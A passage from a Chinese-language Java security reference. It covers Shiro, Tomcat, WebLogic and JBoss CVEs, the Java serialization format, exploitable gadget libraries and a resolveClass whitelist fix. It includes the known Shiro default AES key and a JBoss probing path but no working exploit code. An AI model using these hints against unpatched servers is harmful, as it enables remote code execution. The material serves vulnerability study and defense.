1.5.3</span></li><li><span>身份验证绕过漏洞</span></li></ul></li><li><p><strong><span>CVE-2020-1957</span></strong></p><ul><li><span>SHIRO-682</span></li><li><span>Apache Shiro </span><span>&lt;</span><span> 1.5.2</span></li><li><span>身份验证绕过漏洞</span></li></ul></li><li><p><strong><span>CVE-2019-12422</span></strong></p><ul><li><span>SHIRO-721</span></li><li><span>Apache Shiro </span><span>&lt;</span><span> 1.4.2</span></li><li><span>Padding Oracle Attack 远程代码执行漏洞</span></li></ul></li><li><p><strong><span>CVE-2016-4437</span></strong></p><ul><li><span>SHIRO-550</span></li><li><span>Apache Shiro </span><span>&lt;</span><span>= 1.2.4</span></li><li><span>反序列化远程代码执行漏洞</span></li></ul></li><li><p><strong><span>CVE-2014-0074</span></strong></p></li><li><p><span>SHIRO-460</span></p></li><li><p><span>Apache Shiro </span><span>&lt;</span><span> 1.2.3</span></p></li><li><p><span>身份验证绕过漏洞</span></p></li></ul><h5 id='cve-2020-13933'><span>CVE-2020-13933</span></h5><blockquote><p><span>Apache Shiro 1.6.0 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。</span></p></blockquote><h5 id='cve-2020-11989'><span>CVE-2020-11989</span></h5><blockquote><p><span>Apache Shiro 1.5.3 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。此漏洞存在两种攻击方式。</span></p></blockquote><h5 id='cve-2020-1957'><span>CVE-2020-1957</span></h5><blockquote><p><span>Apache Shiro 1.5.2 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。</span></p></blockquote><h5 id='cve-2019-12422'><span>CVE-2019-12422</span></h5><blockquote><p><span>Apache Shiro 1.4.2 之前的版本默认使用 AES/CBC/PKCS5Padding 模式加密, 开启 RememberMe 功能的 Shiro组件将允许远程攻击者构造序列化数据，通过 Padding Oracle Attack 进行爆破，即使在秘钥未知的条件下，也可以在目标服务器上执行任意命令。</span></p></blockquote><h5 id='cve-2016-4437'><span>CVE-2016-4437</span></h5><blockquote><p><span>Apache Shiro 1.2.5 之前的版本在 org.apache.shiro.mgt.AbstractRememberMeManager 中存在 AES 默认秘钥 kPH+bIxk5D2deZiIxcaaaA== ，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，在目标服务器上执行任意命令。</span></p></blockquote><h3 id='容器-1'><span>容器</span></h3><p><span>常见的 Java 服务器有 Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere 等，这里对部分框架做一个简单的说明。</span></p><h4 id='tomcat-1'><span>Tomcat</span></h4><p><span>Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，用于开发和调试 JSP 程序。</span></p><p><span>在收到请求后，Tomcat 的处理流程如下：</span></p><ul><li><span>客户端访问 Web 服务器，发送 HTTP 请求</span></li><li><span>Web 服务器接收到请求后，传递给 Servlet 容器</span></li><li><span>Servlet 容器加载 Servlet，产生 Servlet 实例后，向其传递表示请求和响应的对象</span></li><li><span>Servlet 实例使用请求对象得到客户端的请求信息，然后进行相应的处理</span></li><li><span>Servlet 实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给Web 服务器</span></li></ul><p><span>Tomcat 服务器是由一系列可配置的组件构成的，其中核心组件是 Catalina Servlet 容器，它是所有其他Tomcat 组件的顶层容器。</span></p><h5 id='相关-cve-5'><span>相关 CVE</span></h5><ul><li><p><strong><span>CVE-2020-1938</span></strong></p><ul><li><a href='https://www.freebuf.com/vuls/228108.html' target='_blank' class='url'>https://www.freebuf.com/vuls/228108.html</a></li></ul></li><li><h4 id='cve-2019-0232'><span>CVE-2019-0232</span></h4><ul><li><span>远程代码执行</span></li><li><a href='https://github.com/pyn3rd/CVE-2019-0232/' target='_blank' class='url'>https://github.com/pyn3rd/CVE-2019-0232/</a></li></ul></li><li><h4 id='cve-2017-12615'><span>CVE-2017-12615</span></h4><ul><li><span>任意文件写入</span></li><li><a href='https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw%3D%3D&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5'><span>https://mp.weixin.qq.com/s? biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;</span></a><span> </span><a href='https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw%3D%3D&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5'><span>sn=c23b3a3b3b43d70999bdbe644e79f7e5</span></a></li></ul></li><li><p><span>CVE-2013-2067</span></p></li><li><p><span>CVE-2012-4534</span></p></li><li><p><span>CVE-2012-4431</span></p></li><li><p><span>CVE-2012-3546</span></p></li><li><p><span>CVE-2012-3544</span></p></li><li><p><span>CVE-2012-2733</span></p></li><li><p><span>CVE-2011-3375</span></p></li><li><p><span>CVE-2011-3190</span></p></li><li><p><span>CVE-2008-2938</span></p></li></ul><h4 id='weblogic'><span>Weblogic</span></h4><h5 id='简介-21'><span>简介</span></h5><p><span>WebLogic 是美国 Oracle 公司出品的一个 Application Server，是一个基于 Java EE 架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。其将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</span></p><p><span>WebLogic 对业内多种标准的全面支持，包括 EJB、JSP、Servlet、JMS、JDBC 等。</span></p><h5 id='相关-cve-6'><span>相关 CVE</span></h5><ul><li><p><strong><span>CVE-2019-2725</span></strong></p><ul><li><span>wls-wsat 反序列化远程代码执行</span></li></ul></li><li><p><span>CVE-2019-2658</span></p></li><li><p><span>CVE-2019-2650</span></p></li><li><p><span>CVE-2019-2649</span></p></li><li><p><span>CVE-2019-2648</span></p></li><li><p><span>CVE-2019-2647</span></p></li><li><p><span>CVE-2019-2646</span></p></li><li><p><span>CVE-2019-2645</span></p></li><li><p><strong><span>CVE-2019-2618</span></strong></p><ul><li><a href='https://github.com/jas502n/cve-2019-2618/' target='_blank' class='url'>https://github.com/jas502n/cve-2019-2618/</a></li></ul></li><li><p><span>CVE-2019-2615</span></p></li><li><p><span>CVE-2019-2568</span></p></li><li><p><span>CVE-2018-3252</span></p></li><li><p><span>CVE-2018-3248</span></p></li><li><p><span>CVE-2018-3245</span></p></li><li><p><span>CVE-2018-3201</span></p></li><li><p><span>CVE-2018-3197</span></p></li><li><p><strong><span>CVE-2018-3191</span></strong></p><ul><li><a href='https://github.com/voidfyoo/CVE-2018-3191' target='_blank' class='url'>https://github.com/voidfyoo/CVE-2018-3191</a></li><li><a href='https://github.com/Libraggbond/CVE-2018-3191' target='_blank' class='url'>https://github.com/Libraggbond/CVE-2018-3191</a></li></ul></li><li><p><strong><span>CVE-2018-2894</span></strong></p><ul><li><span>任意文件上传</span></li><li><a href='https://xz.aliyun.com/t/2458' target='_blank' class='url'>https://xz.aliyun.com/t/2458</a></li></ul></li><li><p><strong><span>CVE-2018-2893</span></strong></p><ul><li><span>反序列化</span></li><li><a href='https://www.freebuf.com/vuls/178105.html' target='_blank' class='url'>https://www.freebuf.com/vuls/178105.html</a></li></ul></li><li><p><strong><span>CVE-2018-2628</span></strong></p><ul><li><a href='https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA' target='_blank' class='url'>https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a></li></ul></li><li><p><span>CVE-2018-1258</span></p></li><li><p><strong><span>CVE-2017-10271</span></strong></p><ul><li><span>XMLDecoder 反序列化漏洞</span></li><li><a href='http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html'><span>http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.</span></a><span> </span><a href='http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html'><span>freebuf.com%2Fvuls%2F160367.html</span></a></li></ul></li><li><p><span>CVE-2017-3248</span></p></li><li><p><span>CVE-2016-3510</span></p></li><li><p><strong><span>CVE-2015-4852</span></strong></p></li><li><p><a href='https://github.com/roo7break/serialator' target='_blank' class='url'>https://github.com/roo7break/serialator</a></p></li></ul><h4 id='jboss-1'><span>JBoss</span></h4><h5 id='简介-22'><span>简介</span></h5><blockquote><p><span>JBoss 是一个基于 J2EE 的管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB容器，一般与 Tomcat 或 Jetty 绑定使用。</span></p></blockquote><h5 id='相关-cve-7'><span>相关 CVE</span></h5><ul><li><p><strong><span>CVE-2017-12149</span></strong></p><ul><li><span>反序列化漏洞</span></li><li><span>访问 /invoker/readonly ，页面存在即有反序列化漏洞</span></li></ul></li></ul><h4 id='jetty'><span>Jetty</span></h4><h5 id='简介-23'><span>简介</span></h5><blockquote><p><span>Jetty 是一个开源的 servlet 容器。</span></p></blockquote><p>&nbsp;</p><h3 id='沙箱-3'><span>沙箱</span></h3><h4 id='简介-24'><span>简介</span></h4><blockquote><p><span>Java 实现了一套沙箱环境，使远程的非可信代码只能在受限的环境下执行。</span></p></blockquote><h4 id='相关-cve-8'><span>相关 CVE</span></h4><ul><li><span>CVE-2012-0507</span></li><li><span>CVE-2012-4681</span></li><li><span>CVE-2017-3272</span></li><li><span>CVE-2017-3289</span></li></ul><p>&nbsp;</p><h3 id='反序列化-5'><span>反序列化</span></h3><h4 id='简介-25'><span>简介</span></h4><p><span>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中。 Java 中的 ObjectOutputStream 类的 writeObject() 方法可以实现序列化，类 ObjectInputStream 类的 readObject() 方法用于反序列化。如果要实现类的反序列化，则是对其实现 Serializable 接口。</span></p><p><span>当远程服务接受不可信的数据并进行反序列化 当前环境中存在可利用的类时，就认为存在反序列化漏洞。</span></p><h4 id='序列数据结构'><span>序列数据结构</span></h4><ul><li><span>0xaced 魔术头 / STREAM_MAGIC</span></li><li><span>0x0005 版本号 / STREAM_VERSION / 参考 java.io.ObjectStreamConstants</span></li><li><span>0x73 对象类型标识</span></li><li><span>0x72 类描述符标识</span></li></ul><h4 id='序列化流程'><span>序列化流程</span></h4><ul><li><p><span>ObjectOutputStream 实例初始化时，将魔术头和版本号写入 bout (BlockDataOutputStream 类型) 中</span></p></li><li><p><strong><span>调用 ObjectOutputStream.writeObject() 开始写对象数据</span></strong></p><ul><li><p><span>ObjectStreamClass.lookup() 封装待序列化的类描述 (返回 ObjectStreamClass 类型) ，获取包括类名、自定义 serialVersionUID、可序列化字段 (返回 ObjectStreamField 类型) 和构造方法，以及 writeObject、readObject 方法等</span></p></li><li><p><strong><span>writeOrdinaryObject() 写入对象数据</span></strong></p></li><li><p><span>写入对象类型标识</span></p></li><li><p><strong><span>writeClassDesc() 进入分支 writeNonProxyDesc() 写入类描述数据</span></strong>
<span>    -   写入类描述符标识</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>11</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 写入类名</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 写入 SUID (当 SUID 为空时，会进行计算并赋值)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 计算并写入序列化属性标志位</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 写入字段信息数据</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 写入 Block Data 结束标识</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 写入父类描述数据</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 249px;"></div><div class="CodeMirror-gutters" style="height: 249px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><ul><li><strong><span>writeSerialData() 写入对象的序列化数据</span></strong></li></ul></li><li><p><span>若类自定义了 writeObject()，则调用该方法写对象，否则调用 defaultWriteFields()写入对象的字段数据 (若是非原始类型，则递归处理子对象)</span></p></li></ul></li></ul><h4 id='反序列化流程'><span>反序列化流程</span></h4><ul><li><p><span>ObjectInputStream 实例初始化时，读取魔术头和版本号进行校验</span></p></li><li><p><strong><span>调用 ObjectInputStream.readObject() 开始读对象数据</span></strong></p><ul><li><p><span>读取对象类型标识</span></p></li><li><p><strong><span>readOrdinaryObject() 读取数据对象</span></strong></p></li><li><p><strong><span>readClassDesc() 读取类描述数据</span></strong>
<span>    -   读取类描述符标识，进入分支 readNonProxyDesc()</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>15</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 读取类名</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 读取 SUID</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 读取并分解序列化属性标志位</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 读取字段信息数据</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; resolveClass() 根据类名获取待反序列化的类的 Class 对象，如果获取失败，则抛出 ClassNotFoundException</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; skipCustomData() 循环读取字节直到 Block Data 结束标识为止</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; 读取父类描述数据</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; initNonProxy() 中判断对象与本地对象的 SUID 和类名 (不含包名) 是否相同，若不同，则抛出 InvalidClassException</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 385px;"></div><div class="CodeMirror-gutters" style="height: 385px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><ul><li><span>ObjectStreamClass.newInstance() 获取并调用离对象最近的非 Serializable 的父类的无参构造方法 (若不存在，则返回 null) 创建对象实例</span></li><li><strong><span>readSerialData() 读取对象的序列化数据</span></strong></li></ul></li><li><p><span>若类自定义了 readObject()，则调用该方法读对象，否则调用 defaultRead- Fields() 读取并填充对象的字段数据</span></p></li></ul></li></ul><h4 id='漏洞利用'><span>漏洞利用</span></h4><h5 id='存在危险的基础库'><span>存在危险的基础库</span></h5><ul><li><span>com.mchange:c3p0 0.9.5.2</span></li><li><span>com.mchange:mchange-commons-java 0.2.11</span></li><li><span>commons-beanutils 1.9.2</span></li><li><span>commons-collections 3.1</span></li><li><span>commons-fileupload 1.3.1</span></li><li><span>commons-io 2.4</span></li><li><span>commons-logging 1.2</span></li><li><span>org.apache.commons:commons-collections 4.0</span></li><li><span>org.beanshell:bsh 2.0b5</span></li><li><span>org.codehaus.groovy:groovy 2.3.9</span></li><li><span>org.slf4j:slf4j-api 1.7.21</span></li><li><span>org.springframework:spring-aop 4.1.4.RELEASE</span></li></ul><h4 id='回显方式'><span>回显方式</span></h4><ul><li><span>通过中间件特性回显</span></li><li><span>通过抛出异常回显</span></li><li><span>通过 OOB 回显</span></li><li><span>通过写静态文件回显</span></li></ul><h4 id='漏洞修复和防护'><span>漏洞修复和防护</span></h4><h5 id='hook-resolveclass'><span>Hook resolveClass</span></h5><p><span>在使用 readObject() 反序列化时会调用 resolveClass 方法读取反序列化的类名，可以通过 hook 该方法来校验反序列化的类，一个 Demo 如下</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">@Override</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">protected</span> <span class="cm-variable">Class</span><span class="cm-operator">&lt;?&gt;</span> <span class="cm-def">resolveClass</span>(<span class="cm-variable">ObjectStreamClass</span> <span class="cm-variable">desc</span>) <span class="cm-keyword">throws</span> <span class="cm-variable">IOException</span>,<span class="cm-variable">ClassNotFoundException</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">if</span>(<span class="cm-operator">!</span><span class="cm-variable">desc</span>.<span class="cm-variable">getName</span>().<span class="cm-variable">equals</span>(<span class="cm-variable">SerialObject</span>.<span class="cm-keyword">class</span>.<span class="cm-variable">getName</span>())){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">throw</span> <span class="cm-keyword">new</span> <span class="cm-variable">InvalidClassException</span>( <span class="cm-tab" role="presentation" cm-text="	">   </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">"Unauthorizeddeserializationattempt"</span>, <span class="cm-variable">desc</span>.<span class="cm-variable">getName</span>());</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " 